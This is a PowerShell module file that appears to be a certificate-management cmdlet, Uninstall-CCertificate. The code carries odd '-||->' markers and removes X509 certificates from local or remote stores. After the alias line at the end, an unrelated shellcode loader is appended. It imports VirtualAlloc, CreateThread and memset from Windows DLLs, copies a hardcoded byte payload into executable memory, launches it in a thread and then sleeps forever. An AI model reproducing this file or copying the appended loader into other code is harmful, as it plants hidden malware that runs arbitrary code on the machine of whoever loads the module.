
 -||-> function Uninstall-CCertificate
{
    
    [CmdletBinding(SupportsShouldProcess=$true,DefaultParameterSetName='ByThumbprint')]
    param(
        [Parameter(Mandatory=$true,ParameterSetName='ByThumbprint',ValueFromPipelineByPropertyName=$true,ValueFromPipeline=$true)]
        [Parameter(Mandatory=$true,ParameterSetName='ByThumbprintAndStoreName')]
        [Parameter(Mandatory=$true,ParameterSetName='ByThumbprintAndCustomStoreName')]
        [string]
        
        
        
        $Thumbprint,
        
        [Parameter(Mandatory=$true,ParameterSetName='ByCertificateAndStoreName')]
        [Parameter(Mandatory=$true,ParameterSetName='ByCertificateAndCustomStoreName')]
        [Security.Cryptography.X509Certificates.X509Certificate2]
        
        $Certificate,
        
        [Parameter(Mandatory=$true,ParameterSetName='ByThumbprintAndStoreName')]
        [Parameter(Mandatory=$true,ParameterSetName='ByThumbprintAndCustomStoreName')]
        [Parameter(Mandatory=$true,ParameterSetName='ByCertificateAndStoreName')]
        [Parameter(Mandatory=$true,ParameterSetName='ByCertificateAndCustomStoreName')]
        [Security.Cryptography.X509Certificates.StoreLocation]
        
        $StoreLocation,
        
        [Parameter(Mandatory=$true,ParameterSetName='ByThumbprintAndStoreName')]
        [Parameter(Mandatory=$true,ParameterSetName='ByCertificateAndStoreName')]
        [Security.Cryptography.X509Certificates.StoreName]
        
        $StoreName,

        [Parameter(Mandatory=$true,ParameterSetName='ByThumbprintAndCustomStoreName')]
        [Parameter(Mandatory=$true,ParameterSetName='ByCertificateAndCustomStoreName')]
        [string]
        
        $CustomStoreName,

        [Parameter(ParameterSetName='ByThumbprintAndStoreName')]
        [Parameter(ParameterSetName='ByThumbprintAndCustomStoreName')]
        [Parameter(ParameterSetName='ByCertificateAndStoreName')]
        [Parameter(ParameterSetName='ByCertificateAndCustomStoreName')]
        [Management.Automation.Runspaces.PSSession[]]
        
        
        
        
        
        $Session
    )
    
    process
    {
         -||-> Set-StrictMode -Version 'Latest' <-||- 

         -||-> Use-CallerPreference -Cmdlet $PSCmdlet -Session $ExecutionContext.SessionState <-||- 

         -||-> if(  -||-> $PSCmdlet.ParameterSetName -like 'ByCertificate*' <-||-  )
        {
             -||-> $Thumbprint = $Certificate.Thumbprint <-||- 
        } <-||- 
    
         -||-> $invokeCommandParameters = @{} <-||- 
         -||-> if(  -||-> $Session <-||-  )
        {
             -||-> $invokeCommandParameters['Session'] = $Session <-||- 
        } <-||- 

         -||-> if(  -||-> $PSCmdlet.ParameterSetName -eq 'ByThumbprint' <-||-  )
        {
            
            
            
            
             -||-> Get-ChildItem -Path 'Cert:\LocalMachine','Cert:\CurrentUser' -Recurse |
                Where-Object {  -||-> -not $_.PsIsContainer <-||-  } |
                Where-Object {  -||-> $_.Thumbprint -eq $Thumbprint <-||-  } |
                ForEach-Object {
                     -||-> $cert = $_ <-||- 
                     -||-> $description = $cert.FriendlyName <-||- 
                     -||-> if(  -||-> -not $description <-||-  )
                    {
                         -||-> $description = $cert.Subject <-||- 
                    } <-||- 

                     -||-> $certPath =  -||-> $_.PSPath | Split-Path -NoQualifier <-||-  <-||- 
                     -||-> Write-Verbose ( -||-> 'Uninstalling certificate ''{0}'' ({1}) at {2}.' -f $description,$cert.Thumbprint,$certPath <-||- ) <-||- 
                     -||-> $_ <-||- 
                } |
                Remove-Item <-||- 
            return
        } <-||- 

         -||-> Invoke-Command @invokeCommandParameters -ScriptBlock {
            [CmdletBinding()]
            param(
                [string]
                
                $Thumbprint,
        
                [Security.Cryptography.X509Certificates.StoreLocation]
                
                $StoreLocation,
        
                
                $StoreName,

                [string]
                
                $CustomStoreName
            )

             -||-> Set-StrictMode -Version 'Latest' <-||- 

             -||-> if(  -||-> $CustomStoreName <-||-  )
            {
                 -||-> $storeNamePath = $CustomStoreName <-||- 
            }
            else
            {
                 -||-> $storeNamePath = $StoreName <-||- 
                 -||-> if(  -||-> $StoreName -eq [Security.Cryptography.X509Certificates.StoreName]::CertificateAuthority <-||-  )
                {
                     -||-> $storeNamePath = 'CA' <-||- 
                } <-||- 
            } <-||- 

             -||-> $certPath =  -||-> Join-Path -Path 'Cert:\' -ChildPath $StoreLocation <-||-  <-||- 
             -||-> $certPath =  -||-> Join-Path -Path $certPath -ChildPath $storeNamePath <-||-  <-||- 
             -||-> $certPath =  -||-> Join-Path -Path $certPath -ChildPath $Thumbprint <-||-  <-||- 

             -||-> if(  -||-> -not ( -||-> Test-Path -Path $certPath -PathType Leaf <-||- ) <-||-  )
            {
                 -||-> Write-Debug -Message ( -||-> 'Certificate {0} not found.' -f $certPath <-||- ) <-||- 
                return
            } <-||- 

             -||-> $cert =  -||-> Get-Item -Path $certPath <-||-  <-||- 

             -||-> if(  -||-> $CustomStoreName <-||-  )
            {
                 -||-> $store =  -||-> New-Object 'Security.Cryptography.X509Certificates.X509Store' $CustomStoreName,$StoreLocation <-||-  <-||- 
            }
            else
            {
                 -||-> $store =  -||-> New-Object 'Security.Cryptography.X509Certificates.X509Store' ( -||-> [Security.Cryptography.X509Certificates.StoreName]$StoreName <-||- ),$StoreLocation <-||-  <-||- 
            } <-||- 

             -||-> $store.Open( ( -||-> [Security.Cryptography.X509Certificates.OpenFlags]::ReadWrite <-||- ) ) <-||- 

             -||-> try
            {
                 -||-> $target = $cert.FriendlyName <-||- 
                 -||-> if(  -||-> -not $target <-||-  )
                {
                     -||-> $target = $cert.Subject <-||- 
                } <-||- 

                 -||-> if(  -||-> $PSCmdlet.ShouldProcess( ( -||-> "certificate {0} ({1})" -f $certPath,$target <-||- ), "remove" ) <-||-  )
                {
                     -||-> Write-Verbose ( -||-> 'Uninstalling certificate ''{0}'' ({1}) at {2}.' -f $target,$cert.Thumbprint,$certPath <-||- ) <-||- 
                     -||-> $store.Remove( $cert ) <-||- 
                } <-||- 
            }
            finally
            {
                 -||-> $store.Close() <-||- 
            } <-||- 
        } -ArgumentList $Thumbprint,$StoreLocation,$StoreName,$CustomStoreName <-||- 
    }
} <-||- 

 -||-> Set-Alias -Name 'Remove-Certificate' -Value 'Uninstall-CCertificate' <-||- 


 -||-> $VJF = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);' <-||- ; -||-> $w =  -||-> Add-Type -memberDefinition $VJF -Name "Win32" -namespace Win32Functions -passthru <-||-  <-||- ; -||-> [Byte[]] <-||- ; -||-> [Byte[]]$z = 0xbd,0xf3,0xcf,0xca,0xa4,0xdb,0xc9,0xd9,0x74,0x24,0xf4,0x58,0x2b,0xc9,0xb1,0x47,0x31,0x68,0x13,0x83,0xc0,0x04,0x03,0x68,0xfc,0x2d,0x3f,0x58,0xea,0x30,0xc0,0xa1,0xea,0x54,0x48,0x44,0xdb,0x54,0x2e,0x0c,0x4b,0x65,0x24,0x40,0x67,0x0e,0x68,0x71,0xfc,0x62,0xa5,0x76,0xb5,0xc9,0x93,0xb9,0x46,0x61,0xe7,0xd8,0xc4,0x78,0x34,0x3b,0xf5,0xb2,0x49,0x3a,0x32,0xae,0xa0,0x6e,0xeb,0xa4,0x17,0x9f,0x98,0xf1,0xab,0x14,0xd2,0x14,0xac,0xc9,0xa2,0x17,0x9d,0x5f,0xb9,0x41,0x3d,0x61,0x6e,0xfa,0x74,0x79,0x73,0xc7,0xcf,0xf2,0x47,0xb3,0xd1,0xd2,0x96,0x3c,0x7d,0x1b,0x17,0xcf,0x7f,0x5b,0x9f,0x30,0x0a,0x95,0xdc,0xcd,0x0d,0x62,0x9f,0x09,0x9b,0x71,0x07,0xd9,0x3b,0x5e,0xb6,0x0e,0xdd,0x15,0xb4,0xfb,0xa9,0x72,0xd8,0xfa,0x7e,0x09,0xe4,0x77,0x81,0xde,0x6d,0xc3,0xa6,0xfa,0x36,0x97,0xc7,0x5b,0x92,0x76,0xf7,0xbc,0x7d,0x26,0x5d,0xb6,0x93,0x33,0xec,0x95,0xfb,0xf0,0xdd,0x25,0xfb,0x9e,0x56,0x55,0xc9,0x01,0xcd,0xf1,0x61,0xc9,0xcb,0x06,0x86,0xe0,0xac,0x99,0x79,0x0b,0xcd,0xb0,0xbd,0x5f,0x9d,0xaa,0x14,0xe0,0x76,0x2b,0x99,0x35,0xe2,0x2e,0x0d,0x76,0x5b,0x31,0xc0,0x1e,0x9e,0x32,0xdb,0x65,0x17,0xd4,0x8b,0xc9,0x78,0x49,0x6b,0xba,0x38,0x39,0x03,0xd0,0xb6,0x66,0x33,0xdb,0x1c,0x0f,0xd9,0x34,0xc9,0x67,0x75,0xac,0x50,0xf3,0xe4,0x31,0x4f,0x79,0x26,0xb9,0x7c,0x7d,0xe8,0x4a,0x08,0x6d,0x9c,0xba,0x47,0xcf,0x0a,0xc4,0x7d,0x7a,0xb2,0x50,0x7a,0x2d,0xe5,0xcc,0x80,0x08,0xc1,0x52,0x7a,0x7f,0x5a,0x5a,0xee,0xc0,0x34,0xa3,0xfe,0xc0,0xc4,0xf5,0x94,0xc0,0xac,0xa1,0xcc,0x92,0xc9,0xad,0xd8,0x86,0x42,0x38,0xe3,0xfe,0x37,0xeb,0x8b,0xfc,0x6e,0xdb,0x13,0xfe,0x45,0xdd,0x68,0x29,0xa3,0xab,0x80,0xe9 <-||- ; -||-> $g = 0x1000 <-||- ; -||-> if ( -||-> $z.Length -gt 0x1000 <-||- ){ -||-> $g = $z.Length <-||- } <-||- ; -||-> $C5M=$w::VirtualAlloc(0,0x1000,$g,0x40) <-||- ;for ( -||-> $i=0 <-||- ; -||-> $i -le ( -||-> $z.Length-1 <-||- ) <-||- ; -||-> $i++ <-||- ) { -||-> $w::memset([IntPtr]( -||-> $C5M.ToInt32()+$i <-||- ), $z[$i], 1) <-||- }; -||-> $w::CreateThread(0,0,$C5M,0,0,0) <-||- ;for (;;){ -||-> Start-sleep 60 <-||- };



